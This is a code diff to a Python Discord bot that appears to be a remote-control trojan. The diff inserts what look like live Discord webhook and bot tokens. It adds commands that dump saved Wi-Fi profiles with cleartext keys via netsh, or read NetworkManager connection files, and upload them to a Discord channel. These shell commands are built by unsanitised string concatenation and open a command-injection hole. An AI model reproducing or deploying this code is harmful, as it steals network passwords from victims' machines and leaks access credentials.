@@ -15,8 +15,8 @@ except ModuleNotFoundError:
 #url
 
 public_ip = "https://checkip.amazonaws.com"
-Webhook_url = "Webhook Url Here"
-discord_bot_token = 'discord bot token here'
+Webhook_url = "https://discord.com/api/webhooks/1065380357526016020/w1WvYwseIsMiUYr5KKfabUwRYPK0IRoPTNFzTBHzDapsNOmG58bHLx71X__VXmQLcBH4"
+discord_bot_token = 'MTA2MTAyNjc5ODY5NzE5MzU3Mg.GVf8iu.qVYjaLpybntIexXIgwkmbOyGFpfum_l7E9iWoQ'
 
 #end url
 
@@ -188,6 +188,34 @@ async def disconnect(ctx):
 
 @client.command()
 @commands.has_permissions(administrator=True)
+async def wifi_profiles(ctx):
+    if(platform.system() == "Windows"):
+        l = os.system("netsh wlan show profiles > wifi_profiles.txt")
+        if(l == 0):
+            await ctx.send(file=discord.File('wifi_profiles.txt'))
+            os.remove("wifi_profile.txt")
+        else:
+            await ctx.send("Error. wifi profile not found")
+    else:
+        await ctx.send(os.listdir("/etc/NetworkManager/system-connections/"))
+
+@client.command()
+@commands.has_permissions(administrator=True)
+async def wifi_info(ctx, wifi_name):
+    if(platform.system() == "Windows"):
+        os.system("netsh wlan show profiles " + wifi_name + " key=clear > wifi_info.txt")
+        await ctx.send(file=discord.File('wifi_info.txt'))
+        os.remove("wifi_info.txt")
+    else:
+        l = os.system("cat '/etc/NetworkManager/system-connections/" + wifi_name + "' > wifi_info.txt")
+        if(l != 0):
+            await ctx.send("Error. Permission denied")
+        else:
+            await ctx.send(file=discord.File('wifi_info.txt'))
+            os.remove("wifi_info.txt")
+
+@client.command()
+@commands.has_permissions(administrator=True)
 async def system_info(ctx):
     systemInfo = platform.system()
     await ctx.send(systemInfo)
@@ -273,7 +301,6 @@ async def play_video(ctx, link):
         os.startfile("video2.mp4")
     except:
         await ctx.send("error...")
-
 
 @client.command()
 @commands.has_permissions(administrator=True)
